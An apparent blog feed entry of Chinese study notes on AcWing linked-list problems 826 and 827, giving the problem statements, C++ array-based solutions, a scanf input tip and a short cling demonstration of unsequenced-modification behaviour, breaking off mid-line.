      <url>/2022/12/26/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-2-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="单链表">单链表</h1><h2 id="AcWing-826-单链表"><a href="https://www.acwing.com/problem/content/828/">AcWing 826. 单链表</a></h2><p>实现一个单链表，链表初始为空，支持三种操作：</p><ol><li>向链表头插入一个数；</li><li>删除第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数后面的数；</li><li>在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数后插入一个数。</li></ol><p>现在要对该链表进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 次操作，进行完所有操作后，从头到尾输出整个链表。</p><p><strong>注意</strong>:题目中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数并不是指当前链表的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个数。例如操作过程中一共插入了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个数，则按照插入的时间顺序，这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个数依次为：第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 个插入的数，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 个插入的数，…第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个插入的数。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示操作次数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行包含一个操作命令，操作命令可能为以下几种：</p><ol><li><code>H x</code>，表示向链表头插入一个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>。</li><li><code>D k</code>，表示删除第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数后面的数（当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 时，表示删除头结点）。</li><li><code>I k x</code>，表示在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数后面插入一个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>（此操作中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 均大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>）。</li></ol><p><strong>输出格式</strong></p><p>共一行，将整个链表从头到尾输出。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span><br>所有操作保证合法。</p><p><strong>输入样例：</strong></p><pre><code>10H 9I 1 1D 1D 0H 6I 3 6I 4 5I 4 5I 3 4D 6</code></pre><p><strong>输出样例：</strong></p><pre><code>6 4 6 5</code></pre><h3 id="数组模拟单链表">数组模拟单链表</h3><blockquote><p><mark>不要通过scan(“%c”, &amp;op)</mark> 读入操作字符：会读进<code>\n</code></p><p>可以使用<code>scanf(&quot; %c&quot;, &amp;op)`` ``scanf(&quot; %c&quot;, &amp;c)</code>在%c之前空格会告诉scanf忽略前面的空行，而等待第一个非空行元素读入其中</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> e[kN], ne[kN], head, idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  head = <span class="number">-1</span>, idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToHead</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  e[idx] = x, ne[idx] = head, head = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在下标为k节点的后面插入值为x的新节点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  e[idx] = x, ne[idx] = ne[k], ne[k] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除下标为k节点的后面一个节点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Del</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">  ne[k] = ne[ne[k]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Init</span>();</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="type">char</span> op;</span><br><span class="line">  <span class="type">int</span> k, x;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;op);</span><br><span class="line">    <span class="comment">// cin &gt;&gt; op;</span></span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;H&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">AddToHead</span>(x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;D&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">      <span class="keyword">if</span> (!k) &#123;</span><br><span class="line">        head = ne[head];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">Del</span>(k - <span class="number">1</span>);  <span class="comment">// 第k个节点的下标为k-1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(k - <span class="number">1</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = head; i != <span class="number">-1</span>; i = ne[i]) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="双链表">双链表</h1><h2 id="AcWing-827-双链表"><a href="https://www.acwing.com/problem/content/829/">AcWing 827. 双链表</a></h2><p>实现一个双链表，双链表初始为空，支持 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 种操作：</p><ol><li>在最左侧插入一个数；</li><li>在最右侧插入一个数；</li><li>将第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数删除；</li><li>在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数左侧插入一个数；</li><li>在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数右侧插入一个数</li></ol><p>现在要对该链表进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 次操作，进行完所有操作后，从左到右输出整个链表。</p><p><strong>注意</strong>:题目中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数并不是指当前链表的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个数。例如操作过程中一共插入了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个数，则按照插入的时间顺序，这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个数依次为：第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 个插入的数，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 个插入的数，…第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个插入的数。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示操作次数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行包含一个操作命令，操作命令可能为以下几种：</p><ol><li><code>L x</code>，表示在链表的最左端插入数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>。</li><li><code>R x</code>，表示在链表的最右端插入数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>。</li><li><code>D k</code>，表示将第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数删除。</li><li><code>IL k x</code>，表示在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数左侧插入一个数。</li><li><code>IR k x</code>，表示在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个插入的数右侧插入一个数。</li></ol><p><strong>输出格式</strong></p><p>共一行，将整个链表从左到右输出。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span><br>所有操作保证合法。</p><p><strong>输入样例：</strong></p><pre><code>10R 7D 1L 3IL 2 10D 3IL 2 7L 8R 9IL 4 7IR 2 2</code></pre><p><strong>输出样例：</strong></p><pre><code>8 7 7 3 2 9</code></pre><h3 id="算法">算法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> e[kN], l[kN], r[kN], idx;  <span class="comment">// l[i]: 下标为i节点的左节点下标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化: 设置下标分别为0和1的点作为左右端点, 第1个工作节点的下标为2</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  r[<span class="number">0</span>] = <span class="number">1</span>, r[<span class="number">1</span>] = <span class="number">0</span>, idx = <span class="number">2</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在下标为k的元素后面插入插入x</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    l[idx] = k, r[idx] = r[k];</span><br><span class="line">    l[r[k]] = idx, r[k] = idx++; <span class="comment">// 不能写成l[r[idx]] = idx++: 会先算idx++导致idx改变</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Del</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">  l[r[k]] = l[k], r[l[k]] = r[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Init</span>();</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  </span><br><span class="line">  string op;</span><br><span class="line">  <span class="type">int</span> k, x;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;L&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(<span class="number">0</span>, x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;R&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(l[<span class="number">1</span>], x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;D&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">      <span class="built_in">Del</span>(k + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;IL&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(l[k + <span class="number">1</span>], x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;IR&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(k + <span class="number">1</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = r[<span class="number">0</span>]; i != <span class="number">1</span>; i = r[i]) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="语法问题">语法问题</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[cling]$ <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">[cling]$ <span class="type">int</span> idx = <span class="number">1</span>;</span><br><span class="line">[cling]$ a[idx] = idx++;</span><br><span class="line">input_line_5:<span class="number">2</span>:<span class="number">14</span>: warning: unsequenced modification <span class="keyword">and</span> access to <span class="string">&#x27;idx&#x27;</span> [-Wunsequenced]</span><br><span class="line"> a[idx] = idx++;</span><br><span class="line">   ~~~       ^</span><br><span class="line">[cling]$ <span class="built_in">a</span></span><br><span class="line">(<span class="type">int</span> [<span class="number">10</span>]) &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;  <span class="comment">// 将idx++后再赋值</span></span><br><span class="line">[cling]$ a[<span class="number">0</span>] = idx++;</span><br><span class="line">[cling]$ <span 